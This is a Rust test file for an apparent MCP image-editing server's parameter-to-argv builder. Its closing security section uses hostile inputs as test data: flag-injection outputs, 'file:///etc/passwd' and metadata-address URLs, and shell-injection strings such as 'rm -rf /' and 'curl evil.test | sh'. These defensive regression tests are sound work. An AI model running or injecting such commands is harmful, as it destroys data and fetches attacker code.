//! Parameter → argv mapping and validation guards (pure; no CLI binary needed).

use serde_json::json;
use stencil_mcp::args::{build_argv, EditParams};
use stencil_mcp::config::Surface;

fn params(value: serde_json::Value) -> EditParams {
    serde_json::from_value(value).expect("params should deserialize")
}

#[test]
fn minimal_input_output() {
    let p = params(json!({ "input": "a.png", "output": "out.png" }));
    assert_eq!(build_argv(&p, None).unwrap(), ["-i", "a.png", "out.png"]);
}

#[test]
fn full_pipeline_order_and_flags() {
    let p = params(json!({
        "input": "photo.jpg",
        "crop": "x1=10% x2=90% y1=10% y2=90%",
        "rotate": 1,
        "filter": "sepia",
        "output": "out.png"
    }));
    assert_eq!(
        build_argv(&p, Some("/tmp/layout.json")).unwrap(),
        [
            "-i",
            "photo.jpg",
            "-c",
            "x1=10% x2=90% y1=10% y2=90%",
            "-r",
            "1",
            "-l",
            "/tmp/layout.json",
            "--filter",
            "sepia",
            "out.png"
        ]
    );
}

#[test]
fn crop_object_renders_to_spec() {
    let p = params(json!({
        "input": "a.png",
        "crop": { "x1": "10%", "x2": "-10%", "y2": "200px" },
        "output": "out.png"
    }));
    let argv = build_argv(&p, None).unwrap();
    let i = argv.iter().position(|a| a == "-c").unwrap();
    assert_eq!(argv[i + 1], "x1=10% x2=-10% y2=200px");
}

#[test]
fn negative_rotate_is_passed_through() {
    let p = params(json!({ "input": "a.png", "rotate": -1, "output": "out.png" }));
    let argv = build_argv(&p, None).unwrap();
    let i = argv.iter().position(|a| a == "-r").unwrap();
    assert_eq!(argv[i + 1], "-1");
}

#[test]
fn blank_with_dims_color_and_album() {
    let p = params(json!({
        "blank": { "width": 800, "height": 600, "color": "red" },
        "album": true,
        "output": "out"
    }));
    assert_eq!(
        build_argv(&p, None).unwrap(),
        ["--blank", "800", "600", "red", "--album", "out"]
    );
}

#[test]
fn blank_default_size() {
    let p = params(json!({ "blank": { "color": "#102030" }, "output": "page.png" }));
    assert_eq!(
        build_argv(&p, None).unwrap(),
        ["--blank", "#102030", "page.png"]
    );
}

#[test]
fn blank_page_format_and_color() {
    // The page token rides argv verbatim; the CLI normalizes the case.
    let p = params(json!({ "blank": { "page": "b5", "color": "pink" }, "output": "page.png" }));
    assert_eq!(
        build_argv(&p, None).unwrap(),
        ["--blank", "b5", "pink", "page.png"]
    );
}

#[test]
fn blank_unknown_page_name_is_rejected() {
    // The CLI silently skips an unrecognized --blank token (it would become a positional
    // output and the blank would come out A4), so the server must reject it up front.
    for bad in ["Letter", "legal", "A11", "A01", "D4", "custom", " A4 ", ""] {
        let p = params(json!({ "blank": { "page": bad }, "output": "page.png" }));
        let err = build_argv(&p, None).unwrap_err();
        assert!(err.contains("not a known page format"), "{bad:?} got: {err}");
    }
}

#[test]
fn blank_page_names_accepted_case_insensitively() {
    for good in ["A0", "a4", "b10", "C7", "c10"] {
        let p = params(json!({ "blank": { "page": good }, "output": "page.png" }));
        assert_eq!(
            build_argv(&p, None).unwrap(),
            ["--blank", good, "page.png"],
            "page name {good:?} should be accepted"
        );
    }
}

#[test]
fn blank_colors_accepted() {
    // Mirrors the core's parseColor grammar: named / transparent / #hex (3/4/6/8 digits).
    for good in ["red", "REBECCAPURPLE", "transparent", "#abc", "#AbCd", "#102030", "#102030ff"] {
        let p = params(json!({ "blank": { "color": good }, "output": "page.png" }));
        assert_eq!(
            build_argv(&p, None).unwrap(),
            ["--blank", good, "page.png"],
            "color {good:?} should be accepted"
        );
    }
}

#[test]
fn blank_unknown_color_is_rejected() {
    // The CLI leaves an unparseable --blank colour unconsumed (it would fall to the
    // positional output slot and the blank would come out white), so reject it up front.
    for bad in ["pinkk", "notacolour", "#12", "#12345", "#gggggg", "rgb(1,2,3)", ""] {
        let p = params(json!({ "blank": { "color": bad }, "output": "page.png" }));
        let err = build_argv(&p, None).unwrap_err();
        assert!(err.contains("not a recognized color"), "{bad:?} got: {err}");
    }
}

#[test]
fn blank_page_and_dims_are_rejected() {
    let p = params(json!({
        "blank": { "page": "B5", "width": 800, "height": 600 }, "output": "out.png"
    }));
    let err = build_argv(&p, None).unwrap_err();
    assert!(err.contains("mutually exclusive"), "got: {err}");
}

#[test]
fn frame_flag_for_video() {
    let p = params(json!({ "input": "clip.mp4", "frame": 24, "output": "f.png" }));
    assert_eq!(
        build_argv(&p, None).unwrap(),
        ["-i", "clip.mp4", "-f", "24", "f.png"]
    );
}

#[test]
fn input_and_blank_are_mutually_exclusive() {
    let p = params(json!({ "input": "a.png", "blank": {}, "output": "out.png" }));
    let err = build_argv(&p, None).unwrap_err();
    assert!(err.contains("mutually exclusive"), "got: {err}");
}

#[test]
fn missing_source_is_rejected() {
    let p = params(json!({ "output": "out.png" }));
    let err = build_argv(&p, None).unwrap_err();
    assert!(err.contains("no source"), "got: {err}");
}

#[test]
fn blank_half_dimensions_are_rejected() {
    let p = params(json!({ "blank": { "width": 800 }, "output": "out.png" }));
    let err = build_argv(&p, None).unwrap_err();
    assert!(err.contains("together"), "got: {err}");
}

#[test]
fn surface_defaults_when_omitted() {
    let p = params(json!({ "input": "a.png", "output": "out.png" }));
    let default = [Surface::Cli];
    assert_eq!(p.resolve_surfaces(&default).unwrap(), vec![Surface::Cli]);
}

#[test]
fn surface_single_string_override() {
    let p = params(json!({ "input": "a.png", "output": "out.png", "surface": "browser" }));
    assert_eq!(
        p.resolve_surfaces(&[Surface::Cli]).unwrap(),
        vec![Surface::Cli, Surface::Browser]
    );
}

#[test]
fn surface_list_override() {
    let p = params(json!({
        "input": "a.png", "output": "out.png", "surface": ["desktop", "browser"]
    }));
    assert_eq!(
        p.resolve_surfaces(&[Surface::Cli]).unwrap(),
        vec![Surface::Cli, Surface::Desktop, Surface::Browser]
    );
}

#[test]
fn surface_bad_token_errors() {
    let p = params(json!({ "input": "a.png", "output": "out.png", "surface": "nope" }));
    assert!(p.resolve_surfaces(&[Surface::Cli]).is_err());
}

// ── collaboration server ──────────────────────────────────────────────────────

#[test]
fn server_fetch_and_remote_update() {
    let p = params(json!({
        "server": "http://h:8090", "input": "Shared", "filter": "sepia",
        "remote_update": true, "output": "out.png"
    }));
    assert_eq!(
        build_argv(&p, None).unwrap(),
        [
            "--server",
            "http://h:8090",
            "-i",
            "Shared",
            "--filter",
            "sepia",
            "--remote-update",
            "out.png"
        ]
    );
}

#[test]
fn remote_create_with_name() {
    let p = params(json!({
        "input": "photo.png", "rotate": 1,
        "remote": "http://h:8090", "remote_name": "Shared", "output": "out.png"
    }));
    assert_eq!(
        build_argv(&p, None).unwrap(),
        [
            "-i",
            "photo.png",
            "-r",
            "1",
            "--remote",
            "http://h:8090",
            "--remote-name",
            "Shared",
            "out.png"
        ]
    );
}

#[test]
fn fetch_from_one_server_publish_to_another() {
    // One call can fetch a project from one server and create it on a different one.
    let p = params(json!({
        "server": "http://a:8090", "input": "Plans",
        "remote": "http://b:8090", "remote_name": "Plans copy", "output": "out.png"
    }));
    let argv = build_argv(&p, None).unwrap();
    assert_eq!(argv[..2], ["--server", "http://a:8090"]);
    let r = argv.iter().position(|a| a == "--remote").unwrap();
    assert_eq!(argv[r + 1], "http://b:8090");
}

#[test]
fn server_without_input_is_rejected() {
    let p = params(json!({ "server": "http://h:8090", "blank": {}, "output": "out.png" }));
    let err = build_argv(&p, None).unwrap_err();
    assert!(err.contains("server"), "got: {err}");
}

#[test]
fn server_with_blank_is_rejected() {
    // blank carries a source, so `input` is present — but `server` still can't take a blank.
    let p = params(json!({
        "server": "http://h:8090", "input": "Shared", "blank": {}, "output": "out.png"
    }));
    let err = build_argv(&p, None).unwrap_err();
    assert!(err.contains("blank"), "got: {err}");
}

#[test]
fn remote_update_without_server_is_rejected() {
    let p = params(json!({ "input": "a.png", "remote_update": true, "output": "out.png" }));
    let err = build_argv(&p, None).unwrap_err();
    assert!(err.contains("remote_update"), "got: {err}");
}

#[test]
fn remote_name_without_remote_is_rejected() {
    let p = params(json!({ "input": "a.png", "remote_name": "X", "output": "out.png" }));
    let err = build_argv(&p, None).unwrap_err();
    assert!(err.contains("remote_name"), "got: {err}");
}

// ── argv-hardening / SECURITY regressions ─────────────────────────────────────
//
// argv is built as an array and handed to the CLI without a shell, so token *splitting* is
// impossible by construction. The one remaining vector is flag injection through the
// positional `output` operand (the CLI has no `--` terminator), which `build_argv` now
// rejects. These tests pin both invariants so a future edit can't quietly regress them.

#[test]
fn dash_leading_output_is_rejected_no_flag_injection() {
    // Without the guard these outputs would ride the positional slot and the CLI would parse
    // them as flags — `--album` flips album on, `-l` would even swallow the next token as a
    // layout path. They must be rejected, never emitted into argv.
    for bad in ["--album", "-l", "-r", "--filter", "-i", "--server", "-", "--"] {
        let p = params(json!({ "input": "a.png", "output": bad }));
        let err = build_argv(&p, None).unwrap_err();
        assert!(
            err.contains("must not start with '-'"),
            "output {bad:?} should be rejected, got: {err}"
        );
    }
}

#[test]
fn ordinary_output_paths_are_accepted() {
    // The guard keys off a leading dash only — normal paths (including a leading-dash file
    // name reached via a directory prefix) still pass through as the final operand.
    for good in ["out.png", "./out.png", "sub/-weird.png", "/abs/out.png", "a-b.png"] {
        let p = params(json!({ "input": "a.png", "output": good }));
        let argv = build_argv(&p, None).unwrap();
        assert_eq!(argv.last().unwrap(), good, "output {good:?} should ride argv");
    }
}

#[test]
fn non_http_input_passes_through_as_single_inert_token() {
    // `build_argv` does NOT do scheme/host SSRF validation — that is enforced downstream in
    // the CLI (recently hardened). Here we pin the CURRENT behavior: a `file://` (or any
    // other non-http) `input` is passed through verbatim as one argv token after `-i`, never
    // interpreted or split. SSRF/scheme filtering is the CLI's job.
    for input in [
        "file:///etc/passwd",
        "ftp://host/x",
        "gopher://169.254.169.254/",
        "/etc/passwd",
    ] {
        let p = params(json!({ "input": input, "output": "out.png" }));
        let argv = build_argv(&p, None).unwrap();
        let i = argv.iter().position(|a| a == "-i").unwrap();
        assert_eq!(argv[i + 1], input, "input {input:?} should ride as one token");
    }
}

#[test]
fn non_http_server_and_remote_pass_through_as_single_inert_tokens() {
    // Same contract for the collaboration-server URLs: no scheme validation in the builder
    // (the CLI validates downstream). Pin that each rides as a single argv token.
    let p = params(json!({
        "server": "file:///etc/passwd", "input": "Proj",
        "remote": "gopher://169.254.169.254/", "remote_name": "X", "output": "out.png"
    }));
    let argv = build_argv(&p, None).unwrap();
    let s = argv.iter().position(|a| a == "--server").unwrap();
    assert_eq!(argv[s + 1], "file:///etc/passwd");
    let r = argv.iter().position(|a| a == "--remote").unwrap();
    assert_eq!(argv[r + 1], "gopher://169.254.169.254/");
}

#[test]
fn hostile_input_with_shell_metacharacters_stays_one_argv_token() {
    // No shell is ever involved (the CLI is exec'd with an argv array), so metacharacters are
    // inert. Assert each hostile input is exactly one argv element — never split, never a
    // second token — for `input`, `crop`, `filter`, and the layout path alike.
    for hostile in [
        "a.png; rm -rf /",
        "$(rm -rf /)",
        "`reboot`",
        "a.png && curl evil.test | sh",
        "a.png\nrm -rf /",
        "a.png | tee /etc/passwd",
    ] {
        let p = params(json!({
            "input": hostile, "crop": hostile, "filter": hostile, "output": "out.png"
        }));
        let argv = build_argv(&p, Some(hostile)).unwrap();

        let count = argv.iter().filter(|a| a.as_str() == hostile).count();
        assert_eq!(count, 4, "hostile {hostile:?} should appear as 4 whole tokens (-i/-c/-l/--filter values)");

        let i = argv.iter().position(|a| a == "-i").unwrap();
        assert_eq!(argv[i + 1], hostile);
        let c = argv.iter().position(|a| a == "-c").unwrap();
        assert_eq!(argv[c + 1], hostile);
        let l = argv.iter().position(|a| a == "-l").unwrap();
        assert_eq!(argv[l + 1], hostile);
        let f = argv.iter().position(|a| a == "--filter").unwrap();
        assert_eq!(argv[f + 1], hostile);
    }
}
